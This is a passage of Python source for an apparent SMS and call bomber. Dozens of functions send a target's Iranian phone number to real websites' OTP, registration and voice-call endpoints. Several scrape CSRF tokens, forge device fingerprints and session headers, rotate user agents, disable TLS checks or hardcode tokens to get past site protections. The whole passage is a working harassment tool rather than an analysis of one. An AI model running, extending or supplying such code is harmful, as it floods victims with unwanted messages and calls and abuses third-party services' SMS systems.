        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "Origin": "https://pinket.com",
            "Referer": "https://pinket.com/"
        }
        
        payload = {
            "phoneNumber": formatted_phone
        }
        
        response = requests.post(
            "https://pinket.com/api/cu/v2/phone-verification",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[pinket] Status: {response.status_code}{a}')
        print(f'{y}[pinket] Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(pinket) OTP sent successfully! ✅{a}')
            return True
        else:
            print(f'{r}[-] pinket error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] pinket exception: {e}{a}')
        return False


def harikashop(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        # تولید اطلاعات تصادفی
        first_name = "کاربر"
        last_name = "تست"
        password = f"Test{random.randint(1000, 9999)}"
        
        payload = {
            'username': formatted_phone,
            'id_customer': '',
            'back': 'https://harikashop.com/login?back=my-account',
            'firstname': first_name,
            'lastname': last_name,
            'password': password,
            'action': 'register',
            'ajax': '1'
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://harikashop.com",
            "Referer": "https://harikashop.com/login?back=my-account"
        }
        
        response = requests.post(
            "https://harikashop.com/login?back=my-account",
            data=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[harikashop] Status: {response.status_code}{a}')
        print(f'{y}[harikashop] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(harikashop) Registration request sent! ✅{a}')
            return True
        else:
            print(f'{r}[-] harikashop error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] harikashop exception: {e}{a}')
        return False


def masterkala(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer your_token_here",  # اگر نیاز به توکن دارد
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "Origin": "https://masterkala.com",
            "Referer": "https://masterkala.com/"
        }
        
        payload = {
            "type": "sendotp",
            "phone": formatted_phone
        }
        
        response = requests.post(
            "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[masterkala] Status: {response.status_code}{a}')
        print(f'{y}[masterkala] Response: {response.text}{a}')
        
        if response.status_code == 200:
            print(f'{g}(masterkala) OTP sent successfully! ✅{a}')
            return True
        else:
            print(f'{r}[-] masterkala error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] masterkala exception: {e}{a}')
        return False
        


def tebinja(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": random.choice(user_agents),
        }
        
        payload = {
            "username": formatted_phone,
            "captchaHash": "",
            "captchaValue": ""
        }
        
        response = requests.post(
            "https://www.tebinja.com/api/v1/users",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] tebinja Status: {response.status_code}{a}')
        print(f'{y}[Debug] tebinja Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(tebinja) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] tebinja error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] tebinja exception: {e}{a}')
        return False

def drto(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json", 
            "app-version": "2.0.0",
            "User-Agent": random.choice(user_agents),
        }
        
        payload = {
            "mobile": formatted_phone,
            "country_id": 205,
            "captcha": ""
        }
        
        response = requests.post(
            "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] drto Status: {response.status_code}{a}')
        print(f'{y}[Debug] drto Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(drto) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] drto error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] drto exception: {e}{a}')
        return False

def tapsi(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        payload = {
            "credential": {
                "phoneNumber": formatted_phone,
                "role": "PASSENGER"
            }
        }
        
        response = requests.post(
            "https://tap33.me/api/v2/user",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] tapsi Status: {response.status_code}{a}')
        print(f'{y}[Debug] tapsi Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(tapsi) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] tapsi error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] tapsi exception: {e}{a}')
        return False
        

def virgool(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        payload = {
            "method": "phone",
            "identifier": formatted_phone
        }
        
        response = requests.post(
            "https://virgool.io/api/v1.4/auth/verify",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] virgool Status: {response.status_code}{a}')
        print(f'{y}[Debug] virgool Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(virgool) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] virgool error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] virgool exception: {e}{a}')
        return False



def otaghak(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        payload = {
            "userName": formatted_phone
        }
        
        response = requests.post(
            "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] otaghak Status: {response.status_code}{a}')
        print(f'{y}[Debug] otaghak Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(otaghak) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] otaghak error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] otaghak exception: {e}{a}')
        return False


def ShahreSandal(phone):
    try:
        session = requests.Session()
        
        # ابتدا صفحه اصلی را برای دریافت CSRF Token بگیریم
        home_response = session.get(
            "https://shahresandal.com/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج CSRF Token از صفحه
        csrf_token = None
        csrf_patterns = [
            r'name="csrf-token" content="([^"]+)"',
            r'X-CSRF-TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            print(f'{r}[-] ShahreSandal: Could not extract CSRF Token{a}')
            return False
        
        print(f'{g}[+] CSRF Token: {csrf_token}{a}')
        
        # حالا درخواست ارسال کد
        url = "https://shahresandal.com/sendcode"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-CSRF-Token": csrf_token,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://shahresandal.com",
            "Referer": "https://shahresandal.com/",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = session.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] ShahreSandal Status: {response.status_code}{a}')
        print(f'{y}[Debug] ShahreSandal Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(ShahreSandal) Code Sent{a}')
                    return True
            except:
                if "success" in response.text.lower():
                    print(f'{g}(ShahreSandal) Code Sent{a}')
                    return True
        elif response.status_code == 419:
            print(f'{r}[-] ShahreSandal: CSRF Token Expired/Invalid{a}')
            return False
        
        return False
            
    except Exception as e:
        print(f'{r}[!] ShahreSandal Exception: {e}{a}')
        return False
        

def Balad(phone):
    try:
        formatted_phone = "0" + phone.replace("+98", "")  # تبدیل +989... به 09...
        
        url = "https://account.api.balad.ir/api/web/auth/login/"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "device-id": str(uuid.uuid4()),
            "User-Agent": random.choice(user_agents)
        }
        
        payload = {
            "phone_number": formatted_phone,
            "os_type": "W"
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(Balad) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Balad Exception: {e}{a}')
        return False


def Charsooq(phone):
    try:
        url = "https://app.charsooq.com/api/v1/send-otp"
        
        # فرمت شماره: 09113339999 (با صفر اول)
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # مطمئن شویم که با صفر شروع می‌شود
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://app.charsooq.com",
            "Referer": "https://app.charsooq.com/",
        }
        
        payload = {
            "cell_number": formatted_phone  # با فرمت 09123334455
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Charsooq Status: {response.status_code}{a}')
        print(f'{y}[Debug] Charsooq Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            print(f'{g}(Charsooq) Code Sent{a}')
            return True
        elif response.status_code == 422:
            print(f'{y}[!] Charsooq Validation Error{a}')
            return False
        else:
            print(f'{r}[-] Charsooq HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Charsooq Exception: {e}{a}')
        return False



def Koohshid(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج CSRF
        home_response = session.get(
            "https://koohshid.com/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج CSRF از صفحه
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
        csrf = csrf_match.group(1) if csrf_match else "5282f04eb5"
        
        if not csrf:
            print(f'{r}[-] Koohshid: Could not extract CSRF token{a}')
            return False
        
        print(f'{g}[+] CSRF Token: {csrf}{a}')
        
        # آماده سازی payload
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://koohshid.com",
            "Referer": "https://koohshid.com/",
        }
        
        response = session.post(
            "https://koohshid.com/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Koohshid Status: {response.status_code}{a}')
        print(f'{y}[Debug] Koohshid Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success") or "sent" in str(data).lower():
                    print(f'{g}(Koohshid) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Koohshid Failed: {data.get("message", "Unknown")}{a}')
                    return False
            except:
                if "1" in response.text or "success" in response.text.lower():
                    print(f'{g}(Koohshid) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Koohshid HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Koohshid Exception: {e}{a}')
        return False
        

def Okala(phone):
    try:
        url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Correlation-Id": str(uuid.uuid4()),
            "session-id": str(uuid.uuid4()),
            "ui-version": "2.0",
            "source": "okala",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://okala.com",
            "Referer": "https://okala.com/",
        }
        
        payload = {
            "mobile": formatted_phone,
            "confirmTerms": True,
            "notRobot": False,
            "ValidationCodeCreateReason": 5,
            "OtpApp": 0,
            "deviceTypeCode": 7,
            "IsAppOnly": False
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Okala Status: {response.status_code}{a}')
        print(f'{y}[Debug] Okala Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("isSuccess") or data.get("otpSent"):
                    print(f'{g}(Okala) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Okala Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "otp" in response.text.lower():
                    print(f'{g}(Okala) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Okala HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Okala Exception: {e}{a}')
        return False



def Besparto(phone):
    try:
        session = requests.Session()
        
        # اول صفحه اصلی را بگیریم تا توکن را استخراج کنیم
        home_response = session.get(
            "https://besparto.ir/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج Client-Token از صفحه
        client_token = None
        token_patterns = [
            r'Client-Token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'\$2y\$10\$[a-zA-Z0-9./]+'  # pattern برای توکن های bcrypt
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                client_token = match.group(0)  # کل match را بگیریم
                print(f'{g}[+] Found Client-Token: {client_token}{a}')
                break
        
        if not client_token:
            # اگر توکن پیدا نشد، از توکن پیشفرض استفاده کنیم
            client_token = "$2y$10$KH69txfOkqZuhxqF2W1BR.6o0jrrw.X53TH4dMmYfhCDNtwwq/8n6"
            print(f'{y}[!] Using default Client-Token{a}')
        
        # حالا درخواست ارسال کد
        url = "https://api.besparto.ir/customer/v1/token/"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Client-Token": client_token,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://besparto.ir",
            "Referer": "https://besparto.ir/",
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = session.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Besparto Status: {response.status_code}{a}')
        print(f'{y}[Debug] Besparto Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(Besparto) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Besparto Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(Besparto) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Besparto HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Besparto Exception: {e}{a}')
        return False



def DigikalaJet(phone):
    try:
        url = "https://api.digikalajet.ir/user/login-register/"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Request-UUID": str(uuid.uuid4()),
            "ClientId": f"FINGERPRINT-{uuid.uuid4().hex[:20]}",
            "ClientOs": "iOS",
            "Client": "mobile",
            "product-mode": "shop_product",
            "session": f"{uuid.uuid4()}-V2{random.randint(1000000000, 9999999999)}",
            "app-id": str(uuid.uuid4()),
            "clientid-v2": f"FINGERPRINTV2-{uuid.uuid4().hex[:20]}",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://digikalajet.ir",
            "Referer": "https://digikalajet.ir/",
        }
        
        payload = {
            "phone": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] DigikalaJet Status: {response.status_code}{a}')
        print(f'{y}[Debug] DigikalaJet Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(DigikalaJet) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] DigikalaJet Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(DigikalaJet) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] DigikalaJet HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] DigikalaJet Exception: {e}{a}')
        return False



def Sandalestan(phone):
    try:
        session = requests.Session()
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        # اول صفحه را بگیریم تا CSRF Token و fingerprint را دریافت کنیم
        url = f"https://sandalestan.com/register-opt?mobile={formatted_phone}"
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        
        # دریافت صفحه اول
        response = session.get(url, headers=headers, timeout=10)
        
        # استخراج CSRF Token
        csrf_token = None
        csrf_pattern = r'name="csrf-token" content="([^"]+)"'
        match = re.search(csrf_pattern, response.text)
        if match:
            csrf_token = match.group(1)
        
        if not csrf_token:
            print(f'{r}[-] Sandalestan: Could not extract CSRF Token{a}')
            return False
        
        # استخراج fingerprint از صفحه (اگر وجود دارد)
        fingerprint_id = f"fp{random.randint(100000, 999999)}"
        
        # آماده سازی payload برای Livewire
        payload = {
            "fingerprint": {
                "id": fingerprint_id,
                "name": "auth.register",
                "locale": "fa",
                "path": "register-opt",
                "method": "GET"
            },
            "serverMemo": {
                "children": [],
                "errors": [],
                "htmlHash": "7c608e69",
                "data": {
                    "name": None,
                    "password": None,
                    "password_confirmation": None,
                    "email": None,
                    "introducer_mobile": None,
                    "newsletter": 1,
                    "mobile": formatted_phone,
                    "code": None,
                    "step": 2,
                    "type_code": None,
                    "user": None
                },
                "dataMeta": [],
                "checksum": "e089e0c638f7d93a25a684677583a927f8e8af92fd12451b098269cae6685216"
            },
            "updates": [
                {
                    "type": "callMethod",
                    "payload": {
                        "method": "resend",
                        "params": []
                    }
                }
            ]
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json",
            "Accept": "text/html, application/xhtml+xml",
            "X-Livewire": "true",
            "X-CSRF-TOKEN": csrf_token,
            "Referer": f"https://sandalestan.com/register-opt?mobile={formatted_phone}",
            "Origin": "https://sandalestan.com"
        }
        
        # ارسال درخواست به Livewire
        response = session.post(
            "https://sandalestan.com/livewire/message/auth.register",
            json=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Sandalestan Status: {response.status_code}{a}')
        print(f'{y}[Debug] Sandalestan Response: {response.text[:200]}...{a}')
        
        if response.status_code == 200:
            print(f'{g}(Sandalestan) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Sandalestan HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Sandalestan Exception: {e}{a}')
        return False
        



def vitrin_shop(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        session = requests.Session()
        home_response = session.get("https://www.vitrin.shop/", timeout=10)
        fresh_token = session.cookies.get('XSRF-TOKEN', "default-token")
        url = "https://www.vitrin.shop/api/v1/user/request_code"
        payload = {"phone_number": formatted_phone, "forgot_password": False}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "V-Session-ID": str(uuid.uuid4()),
            "V-Fingerprint-ID": str(uuid.uuid4()),
            "X-XSRF-TOKEN": fresh_token,
        }
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(vitrin_shop) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] vitrin_shop Exception: {e}{a}")

def elanza(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        url = "https://api.elanza.com/auth/request"
        payload = {"contact": formatted_phone}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(elanza) Code Sent to {phone}{a}')
        else:
            print(f"{r}[-] (elanza) HTTP Error: {response.status_code}{a}")
    except Exception as e:
        print(f"{r}[!] elanza Exception: {e}{a}")

def trip_call(phone):
    url = "https://gateway.trip.ir/api/Totp"
    payload = {"PhoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Trip - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Trip - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Trip - Call Exception: {e}{a}')
        return False

def paklean_call(phone):
    url = "https://client.api.paklean.com/user/resendVoiceCode"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Paklean - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Paklean - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Paklean - Call Exception: {e}{a}')
        return False

def barghman(phone):
    url = "https://uiapi2.saapa.ir/api/otp/sendCode"
    payload = {"mobile": "0" + phone.split("+98")[1], "from_meter_buy": False}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Bargh-e Man) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Bargh-e Man) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Bargh-e Man Exception: {e}{a}')
        return False

def ragham_call(phone):
    url = "https://web.raghamapp.com/api/users/code"
    payload = {"phone": phone}  # اینجا نیازی به 0 نیست، همون phone که میدی
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Ragham - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Ragham - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Ragham - Call Exception: {e}{a}')
        return False



def angeliran(phone):
    import requests
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    
    try:
        url = "https://angeliran.com/wp-admin/admin-ajax.php"
        
        payload = {
            "digits_phone": formatted_phone,
            "login_digt_countrycode": "+98",
            "action_type": "phone",
            "digits_reg_name": "نام",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": "6f8ca37725ee2166c8fc02c16e17a299",  # instance_id جدید
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://angeliran.com/my-account/",
            "digits_form": "23837de77d",
            "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
            "show_force_title": "1",
            "container": "digits_protected",  # اضافه شده
            "sub_action": "sms_otp"  # اضافه شده
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://angeliran.com",
            "Referer": "https://angeliran.com/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
        }
        
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(angeliran) {a}Code Sent')
                return True
        
        print(f'{r}[-] (angeliran) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (angeliran) Failed{a}')
        return False
        

def mahabadperfume(phone):
    import requests
    import uuid
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mahabadperfume.ir/backend/customer/v2/otp-send/s/"
    
    payload = {
        "phone_number": formatted_phone,
        "is_forget_password": False
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Customer-Signature": str(uuid.uuid4()),  # تولید UUID تصادفی
        "Origin": "https://mahabadperfume.ir",
        "Referer": "https://mahabadperfume.ir/",
        "accept-language": "fa-IR",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mahabadperfume) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mahabadperfume) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mahabadperfume Exception: {e}{a}')
        return False


def theshoes(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://theshoes.ir/api/v1/sessions/login_request"
    
    payload = {
        "mobile_phone": formatted_phone,
        "recaptcha_token": "dummy_token"  # توکن اصلی رو باید خودت بگیری
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://theshoes.ir",
        "Referer": "https://theshoes.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(theshoes) {a}Code Sent')
            return True
        print(f'{r}[-] (theshoes) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] theshoes Exception: {e}{a}')
        return False
        
def mootanroo(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp"
    
    payload = {
        "PhoneNumber": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mootanroo.com",
        "Referer": "https://mootanroo.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
